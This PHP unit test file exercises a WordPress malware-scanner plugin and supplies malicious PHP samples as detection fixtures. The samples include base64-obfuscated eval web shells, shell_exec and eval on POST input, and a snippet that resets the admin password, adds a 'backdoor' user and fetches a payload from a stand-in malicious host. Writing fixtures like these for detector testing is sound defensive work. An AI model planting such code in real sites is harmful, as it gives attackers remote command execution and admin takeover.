<?php

class WP_AI_Security_Scanner_Malware_Detector_Test extends WP_UnitTestCase {
    
    private $detector;
    private $database;
    
    public function setUp() {
        parent::setUp();
        
        $this->database = new WP_AI_Security_Scanner_Database();
        $this->database->create_tables();
        
        $this->detector = new WP_AI_Security_Scanner_Malware_Detector();
    }
    
    public function tearDown() {
        parent::tearDown();
        
        global $wpdb;
        $wpdb->query("DROP TABLE IF EXISTS {$wpdb->prefix}ai_scanner_results");
        $wpdb->query("DROP TABLE IF EXISTS {$wpdb->prefix}ai_scanner_config");
        $wpdb->query("DROP TABLE IF EXISTS {$wpdb->prefix}ai_scanner_quarantine");
    }
    
    public function test_detect_eval_obfuscation() {
        $malicious_code = '<?php eval(base64_decode("ZXZhbCgkX1BPU1RbImNtZCJdKTs=")); ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $malicious_code);
        
        $this->assertNotEmpty($threats);
        $this->assertEquals('eval_obfuscation', $threats[0]['type']);
        $this->assertEquals('high', $threats[0]['severity']);
        $this->assertGreaterThan(0.8, $threats[0]['confidence']);
    }
    
    public function test_detect_file_inclusion() {
        $malicious_code = '<?php include($_GET["file"]); ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $malicious_code);
        
        $this->assertNotEmpty($threats);
        $found_file_inclusion = false;
        
        foreach ($threats as $threat) {
            if ($threat['type'] === 'file_inclusion') {
                $found_file_inclusion = true;
                $this->assertEquals('critical', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_file_inclusion);
    }
    
    public function test_detect_shell_execution() {
        $malicious_code = '<?php shell_exec($_POST["cmd"]); ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $malicious_code);
        
        $this->assertNotEmpty($threats);
        $found_shell_exec = false;
        
        foreach ($threats as $threat) {
            if ($threat['type'] === 'shell_exec') {
                $found_shell_exec = true;
                $this->assertEquals('critical', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_shell_exec);
    }
    
    public function test_detect_backdoor_patterns() {
        $malicious_code = '<?php $c99 = "backdoor"; ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $malicious_code);
        
        $this->assertNotEmpty($threats);
        $found_backdoor = false;
        
        foreach ($threats as $threat) {
            if ($threat['type'] === 'backdoor_pattern') {
                $found_backdoor = true;
                $this->assertEquals('critical', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_backdoor);
    }
    
    public function test_detect_base64_suspicious() {
        $suspicious_code = '<?php $data = base64_decode("' . str_repeat('A', 150) . '"); ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $suspicious_code);
        
        $this->assertNotEmpty($threats);
        $found_base64 = false;
        
        foreach ($threats as $threat) {
            if ($threat['type'] === 'base64_suspicious') {
                $found_base64 = true;
                $this->assertEquals('medium', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_base64);
    }
    
    public function test_detect_crypto_mining() {
        $mining_code = '<?php $miner = "coinhive"; ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $mining_code);
        
        $this->assertNotEmpty($threats);
        $found_mining = false;
        
        foreach ($threats as $threat) {
            if ($threat['type'] === 'crypto_mining') {
                $found_mining = true;
                $this->assertEquals('high', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_mining);
    }
    
    public function test_heuristic_suspicious_functions() {
        $suspicious_code = '<?php eval($code); exec($command); ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $suspicious_code);
        
        $this->assertNotEmpty($threats);
        $found_suspicious = false;
        
        foreach ($threats as $threat) {
            if ($threat['type'] === 'suspicious_function') {
                $found_suspicious = true;
                $this->assertEquals('high', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_suspicious);
    }
    
    public function test_heuristic_user_input() {
        $user_input_code = '<?php echo $_GET["data"]; ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $user_input_code);
        
        $this->assertNotEmpty($threats);
        $found_user_input = false;
        
        foreach ($threats as $threat) {
            if ($threat['type'] === 'user_input') {
                $found_user_input = true;
                $this->assertEquals('medium', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_user_input);
    }
    
    public function test_heuristic_dynamic_include() {
        $dynamic_include_code = '<?php include($file); ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $dynamic_include_code);
        
        $this->assertNotEmpty($threats);
        $found_dynamic_include = false;
        
        foreach ($threats as $threat) {
            if ($threat['type'] === 'dynamic_include') {
                $found_dynamic_include = true;
                $this->assertEquals('high', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_dynamic_include);
    }
    
    public function test_obfuscation_detection() {
        $obfuscated_code = '<?php ' . str_repeat('$a = base64_decode("' . str_repeat('A', 100) . '"); ', 10) . '?>';
        
        $threats = $this->detector->analyze_file('/test.php', $obfuscated_code);
        
        $this->assertNotEmpty($threats);
        $found_obfuscation = false;
        
        foreach ($threats as $threat) {
            if ($threat['type'] === 'obfuscated_code') {
                $found_obfuscation = true;
                $this->assertEquals('medium', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_obfuscation);
    }
    
    public function test_entropy_calculation() {
        $high_entropy_code = '<?php $data = "' . str_repeat('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 100) . '"; ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $high_entropy_code);
        
        $found_high_entropy = false;
        foreach ($threats as $threat) {
            if ($threat['type'] === 'high_entropy') {
                $found_high_entropy = true;
                $this->assertEquals('medium', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_high_entropy);
    }
    
    public function test_behavioral_analysis() {
        $malicious_behavior = '<?php 
            $wpdb->query("UPDATE wp_users SET user_pass = MD5(\"newpass\") WHERE user_login = \"admin\"");
            $user = wp_create_user("backdoor", "password", "test@example.com");
            file_get_contents("https://malicious.com/payload.php");
        ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $malicious_behavior);
        
        $found_malicious_behavior = false;
        foreach ($threats as $threat) {
            if ($threat['type'] === 'malicious_behavior') {
                $found_malicious_behavior = true;
                $this->assertEquals('high', $threat['severity']);
                break;
            }
        }
        
        $this->assertTrue($found_malicious_behavior);
    }
    
    public function test_clean_file_detection() {
        $clean_code = '<?php
            echo "Hello World";
            $message = "This is a clean file";
            function clean_function() {
                return "Safe content";
            }
        ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $clean_code);
        
        $this->assertEmpty($threats);
    }
    
    public function test_false_positive_filtering() {
        $legitimate_code = '<?php
            // This should not trigger false positives
            $encoded_config = base64_encode($config);
            if (file_exists($file)) {
                include($file);
            }
        ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $legitimate_code);
        
        foreach ($threats as $threat) {
            $this->assertLessThan(0.8, $threat['confidence']);
        }
    }
    
    public function test_confidence_scoring() {
        $high_confidence_threat = '<?php eval(base64_decode($_POST["backdoor"])); ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $high_confidence_threat);
        
        $this->assertNotEmpty($threats);
        $this->assertGreaterThan(0.8, $threats[0]['confidence']);
    }
    
    public function test_threat_severity_ordering() {
        $mixed_threats = '<?php
            eval($_POST["cmd"]);  // Critical
            base64_decode("' . str_repeat('A', 100) . '");  // Medium
            echo $_GET["data"];  // Low
        ?>';
        
        $threats = $this->detector->analyze_file('/test.php', $mixed_threats);
        
        $this->assertNotEmpty($threats);
        
        $severities = array_map(function($threat) {
            return $threat['severity'];
        }, $threats);
        
        $severity_order = array('critical', 'high', 'medium', 'low');
        
        $is_sorted = true;
        for ($i = 1; $i < count($severities); $i++) {
            $prev_index = array_search($severities[$i-1], $severity_order);
            $curr_index = array_search($severities[$i], $severity_order);
            
            if ($prev_index > $curr_index) {
                $is_sorted = false;
                break;
            }
        }
        
        $this->assertTrue($is_sorted);
    }
    
    public function test_line_number_detection() {
        $multiline_code = "<?php\n" .
            "echo 'Line 1';\n" .
            "eval(\$_POST['cmd']);\n" .
            "echo 'Line 3';\n" .
            "?>";
        
        $threats = $this->detector->analyze_file('/test.php', $multiline_code);
        
        $this->assertNotEmpty($threats);
        $this->assertEquals(3, $threats[0]['line_number']);
    }
    
    public function test_signature_count() {
        $count = $this->detector->get_signature_count();
        $this->assertGreaterThan(0, $count);
    }
    
    public function test_confidence_threshold() {
        $new_threshold = 0.7;
        $result = $this->detector->set_confidence_threshold($new_threshold);
        $this->assertEquals($new_threshold, $result);
        
        $low_confidence_threat = '<?php echo $_GET["data"]; ?>';
        $threats = $this->detector->analyze_file('/test.php', $low_confidence_threat);
        
        foreach ($threats as $threat) {
            $this->assertGreaterThanOrEqual($new_threshold, $threat['confidence']);
        }
    }
    
    // === API Integration Tests ===
    
    public function test_openai_api_key_validation_invalid() {
        $invalid_key = 'sk-invalid-key-test';
        $is_valid = $this->detector->validate_openai_api_key($invalid_key);
        $this->assertFalse($is_valid);
    }
    
    public function test_virustotal_api_key_validation_invalid() {
        $invalid_key = 'invalid-vt-key-test';
        $is_valid = $this->detector->validate_virustotal_api_key($invalid_key);
        $this->assertFalse($is_valid);
    }
    
    public function test_analyze_file_without_apis() {
        // Test that analysis works without API keys
        update_option('wp_ai_security_scanner_settings', array(
            'use_openai' => false,
            'use_virustotal' => false,
            'openai_api_key' => '',
            'virustotal_api_key' => ''
        ));
        
        $detector = new WP_AI_Security_Scanner_Malware_Detector();
        $malicious_code = '<?php eval(base64_decode("ZXZhbCgkX1BPU1RbImNtZCJdKTs=")); ?>';
        
        $threats = $detector->analyze_file('/test.php', $malicious_code);
        
        $this->assertNotEmpty($threats);
        // Should still detect threats with local analysis
        $this->assertGreaterThan(0, count($threats));
    }
    
    public function test_analyze_file_with_mock_openai() {
        // Mock OpenAI response
        update_option('wp_ai_security_scanner_settings', array(
            'use_openai' => true,
            'openai_api_key' => 'mock-key-for-testing',
            'use_virustotal' => false,
            'virustotal_api_key' => ''
        ));
        
        // Test with detector that has mocked API
        $detector = $this->getMockBuilder('WP_AI_Security_Scanner_Malware_Detector')
                        ->setMethods(['call_openai_api'])
                        ->getMock();
        
        $detector->method('call_openai_api')
                ->willReturn([
                    'analysis' => [
                        'is_malicious' => true,
                        'risk_level' => 'high',
                        'confidence' => 95,
                        'description' => 'Mock OpenAI detected malware',
                        'evidence' => 'eval() function with base64_decode'
                    ]
                ]);
        
        $malicious_code = '<?php eval(base64_decode("ZXZhbCgkX1BPU1RbImNtZCJdKTs=")); ?>';
        $threats = $detector->analyze_file('/test.php', $malicious_code);
        
        $this->assertNotEmpty($threats);
        
        // Check for OpenAI detection
        $openai_threat_found = false;
        foreach ($threats as $threat) {
            if ($threat['type'] === 'openai_detection') {
                $openai_threat_found = true;
                $this->assertEquals('high', $threat['severity']);
                $this->assertEquals(0.95, $threat['confidence']);
                $this->assertEquals('OpenAI', $threat['source']);
                break;
            }
        }
        
        $this->assertTrue($openai_threat_found);
    }
    
    public function test_analyze_file_with_mock_virustotal() {
        // Mock VirusTotal response
        update_option('wp_ai_security_scanner_settings', array(
            'use_openai' => false,
            'openai_api_key' => '',
            'use_virustotal' => true,
            'virustotal_api_key' => 'mock-vt-key-for-testing'
        ));
        
        $detector = $this->getMockBuilder('WP_AI_Security_Scanner_Malware_Detector')
                        ->setMethods(['query_virustotal_hash'])
                        ->getMock();
        
        $detector->method('query_virustotal_hash')
                ->willReturn([
                    'data' => [
                        'attributes' => [
                            'last_analysis_stats' => [
                                'malicious' => 15,
                                'clean' => 50,
                                'suspicious' => 3,
                                'undetected' => 2
                            ]
                        ]
                    ]
                ]);
        
        $malicious_code = '<?php eval(base64_decode("ZXZhbCgkX1BPU1RbImNtZCJdKTs=")); ?>';
        $threats = $detector->analyze_file('/test.php', $malicious_code);
        
        $this->assertNotEmpty($threats);
        
        // Check for VirusTotal detection
        $vt_threat_found = false;
        foreach ($threats as $threat) {
            if ($threat['type'] === 'virustotal_detection') {
                $vt_threat_found = true;
                $this->assertEquals('critical', $threat['severity']);
                $this->assertEquals('VirusTotal', $threat['source']);
                $this->assertStringContains('15/70 engines', $threat['description']);
                break;
            }
        }
        
        $this->assertTrue($vt_threat_found);
    }
    
    public function test_openai_severity_mapping() {
        $detector = new ReflectionClass('WP_AI_Security_Scanner_Malware_Detector');
        $method = $detector->getMethod('map_openai_severity');
        $method->setAccessible(true);
        
        $instance = new WP_AI_Security_Scanner_Malware_Detector();
        
        $this->assertEquals('critical', $method->invoke($instance, 'critical'));
        $this->assertEquals('high', $method->invoke($instance, 'high'));
        $this->assertEquals('medium', $method->invoke($instance, 'medium'));
        $this->assertEquals('low', $method->invoke($instance, 'low'));
        $this->assertEquals('low', $method->invoke($instance, 'unknown'));
    }
    
    public function test_openai_prompt_building() {
        $detector = new ReflectionClass('WP_AI_Security_Scanner_Malware_Detector');
        $method = $detector->getMethod('build_openai_prompt');
        $method->setAccessible(true);
        
        $instance = new WP_AI_Security_Scanner_Malware_Detector();
        $content = '<?php eval($_POST["cmd"]); ?>';
        
        $prompt = $method->invoke($instance, '/test.php', $content);
        
        $this->assertStringContains('php file', $prompt);
        $this->assertStringContains($content, $prompt);
        $this->assertStringContains('JSON format', $prompt);
        $this->assertStringContains('eval', $prompt);
        $this->assertStringContains('base64', $prompt);
    }
    
    public function test_multi_source_threat_detection() {
        // Test that threats from multiple sources are properly merged
        update_option('wp_ai_security_scanner_settings', array(
            'use_openai' => true,
            'openai_api_key' => 'mock-key',
            'use_virustotal' => true,
            'virustotal_api_key' => 'mock-vt-key'
        ));
        
        $detector = $this->getMockBuilder('WP_AI_Security_Scanner_Malware_Detector')
                        ->setMethods(['call_openai_api', 'query_virustotal_hash'])
                        ->getMock();
        
        $detector->method('call_openai_api')
                ->willReturn([
                    'analysis' => [
                        'is_malicious' => true,
                        'risk_level' => 'critical',
                        'confidence' => 90,
                        'description' => 'OpenAI detected malware'
                    ]
                ]);
        
        $detector->method('query_virustotal_hash')
                ->willReturn([
                    'data' => [
                        'attributes' => [
                            'last_analysis_stats' => [
                                'malicious' => 8,
                                'clean' => 60,
                                'suspicious' => 2,
                                'undetected' => 0
                            ]
                        ]
                    ]
                ]);
        
        $malicious_code = '<?php eval(base64_decode($_POST["backdoor"])); ?>';
        $threats = $detector->analyze_file('/test.php', $malicious_code);
        
        $this->assertNotEmpty($threats);
        
        // Should have threats from local analysis, OpenAI, and VirusTotal
        $sources = array_unique(array_column($threats, 'source'));
        $this->assertGreaterThanOrEqual(2, count($sources));
        
        // Check that we have both API sources
        $threat_types = array_column($threats, 'type');
        $this->assertContains('openai_detection', $threat_types);
        $this->assertContains('virustotal_detection', $threat_types);
    }
    
    public function test_api_error_handling() {
        // Test graceful degradation when APIs fail
        update_option('wp_ai_security_scanner_settings', array(
            'use_openai' => true,
            'openai_api_key' => 'mock-key',
            'use_virustotal' => true,
            'virustotal_api_key' => 'mock-vt-key'
        ));
        
        $detector = $this->getMockBuilder('WP_AI_Security_Scanner_Malware_Detector')
                        ->setMethods(['call_openai_api', 'query_virustotal_hash'])
                        ->getMock();
        
        // Mock API failures
        $detector->method('call_openai_api')->willReturn(false);
        $detector->method('query_virustotal_hash')->willReturn(false);
        
        $malicious_code = '<?php eval(base64_decode($_POST["cmd"])); ?>';
        $threats = $detector->analyze_file('/test.php', $malicious_code);
        
        // Should still detect threats with local analysis
        $this->assertNotEmpty($threats);
        
        // Should not have API-based detections due to failures
        $threat_types = array_column($threats, 'type');
        $this->assertNotContains('openai_detection', $threat_types);
        $this->assertNotContains('virustotal_detection', $threat_types);
    }
    
    public function test_api_content_size_limits() {
        // Test that large files are truncated for OpenAI
        $large_content = '<?php eval($_POST["cmd"]); ' . str_repeat('// comment ', 1000) . ' ?>';
        
        $detector = new ReflectionClass('WP_AI_Security_Scanner_Malware_Detector');
        $method = $detector->getMethod('build_openai_prompt');
        $method->setAccessible(true);
        
        $instance = new WP_AI_Security_Scanner_Malware_Detector();
        $prompt = $method->invoke($instance, '/test.php', $large_content);
        
        // Content should be truncated to reasonable size
        $this->assertLessThan(5000, strlen($prompt));
    }
}